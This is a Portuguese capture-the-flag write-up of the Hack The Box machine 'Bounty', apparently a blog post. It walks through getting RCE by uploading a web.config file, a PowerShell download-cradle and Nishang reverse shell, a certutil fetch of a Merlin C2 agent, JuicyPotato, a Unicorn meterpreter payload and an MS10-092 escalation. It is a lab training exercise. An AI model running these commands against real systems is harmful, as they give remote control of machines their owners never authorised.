---
title: "Hack The Box - Bounty"
tags: [Windows,Easy,Merlin,Unicorn,Meterpreter,Nishang,Gobuster,RFI,BurpSuite,BurpSuite Intruder,Config RCE,Certutil,JuicyPotato,Local Exploit Suggester, Schelevator MS10-092,Metasploit Framework]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/142>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nmap.png)


### Explicação de cada parâmetro do Nmap
> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos somente a porta 80 aberta

> Porta 80 -> Servidor Web

## Enumeração servidor Web Porta 80

Ao abrirmos a página no navegador:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_web.png)

### Como sempre devemos deixar algum tipo de enumeração rodando, então vamos deixar o Gobuster nessa porta 80

Gobuster é uma ferramenta muito boa, ela é um pouco mais lenta que o Wfuzz, mas cumpre a finalidade tanto quanto

Explicação sintaxe gobuster

> dir --> Modo enumeração de diretórios

> -u --> URL

> -w --> Wordlist utilizada

> -x --> Vai procurar por arquivos que contenham esse formato também, como eu sei que é windows, possivelmente vai ter arquivos com esse formato

> -t --> Quantidade de threads que serão executadas ao mesmo tempo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_gobuster.png)

#### Encontramos o Transfer.aspx

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_web2.png)

Tentamos realizar o Upload de arquivos dentro dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_arq.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_web3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_web4.png)

Vimos que ele realizou o Upload

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_web5.png)

#### Testando diversos formatos de upload

Como sabemos que ele faz upload de arquivos, temos que descobrir qual formato podemos explorar ali

Para isso criei uma wordlist pequena com alguns formatos que podem ser explorados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_wl.png)

Jogo a requisição de *Upload* para o BurpSuite para automatizar e ficar melhor para trabalharmos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_web3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_burp.png)

Mandamos para o `Intruder`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_burp1.png)

Setamos a wordlist criada anteriormente com as extensões

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_burp2.png)

Iniciamos o ataque

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_burp3.png)

Verificando o tamanho das respotas já plotamos que tem uma que é diferente, que é o config, ele deu diferente pq a resposta do servidor é diferente quando enviamos um arquivo .config

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_burp4.png)

# Exploração

### Verificamos como realizar RCE com arquivos .config

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_aspx.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_aspx1.png)

Pegamos esse script que tem no site para testarmos na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_aspx2.png)

A validação dele é se ele for upado com sucesso, deverá aparecer o número 3.
Dando certo podemos colocar nosso RCE que ele vai executar

#### Testando se temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_config.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_config1.png)

Agora vamos no uploadedfiles e verificamos que temos na saída o número 3, ou seja, temos RCE!!!!!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_config2.png)

### Aqui iremos fazer de dois modos, o primeiro modo, usaremos um shell pronto, que é o Nishang. A segunda utilizaremos a ferramenta Merlin, pra exemplificar seu uso

#### Nishang

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish1.png)

Fazemos o download de todos os shells pra nossa máquina

> https://github.com/samratashok/nishang.git

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish2.png)

##### Utilizando o nishang

O nishang nos facilita muito a vida, pra conseguir utilizar ele será feito desta maneira:

1º Configurando o Nishang pra assim que for executado pela máquina executar o módulo de Shell Reverso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish3.png)

Adicionamos à última linha do script

> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.119 -Port 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish4.png)

Adicionamos ao final do web.config para ele executar

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.16.116/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish5.png)

Ligamos o Python Simple HTTP Server e o `rlwrap` nc na porta 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish6.png)

Upamos o web.config no transfer.aspx

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish7.png)

Executamos ele 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish8.png)

Ganhamos um shell na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish9.png)

#### Através do Merlin

Merlin é uma ferramenta de C2 muito boa, as vezes um pouco complicada de se utilizar, mas aqui iremos tentar abordar da maneira de mais simples entendimento

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin1.png)

Após baixar ele na máquina (git clone) iremos utilizá-lo

Neste caso baixamos a release dele na versão 0.6.0 (Nesses casos eu prefiro baixar a release pq ai não preciso compilar ele na minha máquina)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlinrel.png)

Primeiro passo para utilizá-lo da maneira correta é configurar uma chave SSL na pasta /data/x509

> openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj  "/CN=bounty"  -days 7

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin2.png)

Iniciamos o servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin4.png)

Agora entramos na pasta /cmd/merlinagent e verificamos o agent que deverá ser executado pelo Bounty

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin5.png)

Alteramos o web.config para ele executar o web.config

Aqui utilizaremos o `certutil` para fazer download de arquivos remotos

> certutil -urlcache -split -f http://10.10.16.119/merlinagent.exe C:\\users\\public\\agent.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin6.png)

Upamos no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish7.png)

Executamos ele 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish8.png)

Verificamos que foi baixado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin7.png)

Modificamos novamente o web.config, agora para executar o agent.exe que foi baixado

> cmd /c C:\Users\Public\agent.exe -url https://10.10.16.119:443/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin8.png)

Upamos no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish7.png)

Executamos ele 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish8.png)

Recebemos a conexão no Merlin Server

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin9.png)

Interagimos com a máquina invadida

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin10.png)

Com o help verificamos o que pode ser feito

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin11.png)

Podemos usar módulos para escalação de privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_merlin12.png)

# Escalação de Privilégio

Verificamos as permissões pelo `whoami /priv`

Verificamos o SeImpersonatePrivilege habilitado! Podemos executar o `JuicyPotato`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_priv.png)

Baixamos o JuicyPotato

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_priv1.png)

Novamente, como sou preguiçoso pra caralho vou nos releases

> https://github.com/ohpe/juicy-potato/releases

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_priv2.png)

Enviamos para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_priv3.png)

Agora executamos ele para executar o agent do merlin novamente e nos dar outra seção de authority agora

> cmd C:\\Users\Public\JuicyPotato.exe -t * -p C:\\Users\\Public\\agent.exe -l 5555

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_priv4.png)

# Usando o Unicorn

### Agora utilizaremos o Unicorn também, já que estamos no embalo

A ideia dele é a mesma do Merlin, ele é um C2. Qual é melhor? Sei lá, os dois cumprem a finalidade.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni1.png)

Após baixar pra nossa Kali (no caso eu usei uma release da versão 3.4.5, não sei por que outras versões não funcionaram corretamente)

Executamos ele

> python unicorn.py windows/meterpreter/reverse_tcp 10.10.16.119 443

Devemos setar o payload utilizado, o IP e a porta que irá receber a conexão 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni2.1.png)

Executamos o unicorn.rc (que é um arquivo do Metasploit Framework) que irá ligar o handler pra receber a conexão

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni3.1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni4.1.png)

Alteramos no web.config para executar o powershell_attack.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni5.png)

Ligamos o Simple HTTP Server Python

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni6.png)

Upamos no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish7.png)

Executamos ele 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_nish8.png)

Recebemos a conexão no Metasploit Framework

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni8.png)

# Escalação de Privilégio

Utilizamos o local_exploit_suggester para sugerir exploits para escalação de privilégio

> use post/multi/recon/local_exploit_suggester

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni9.png)

Vamos realizar ele agora com um processo de x64 (antes foi com o meterpreter de x86 - resultados podem ser diferentes - falsos positivos)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni10.png)

Migramos para o PID do processo x64 escolhido

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni11.png)

Rodamos novamente o exploit use post/multi/recon/local_exploit_suggester com o x64 pra ver os resultados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni12.png)

Utilizamos esse pois aparece nos dois, então é provável que dê certo

> use exploit/windows/local/ms10_092_schelevator

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni13.png)

Verificamos as seções e vemos que deu certo!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_uni14.png)

## Agora chega, pegamos a flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bounty/B_user.txt.png)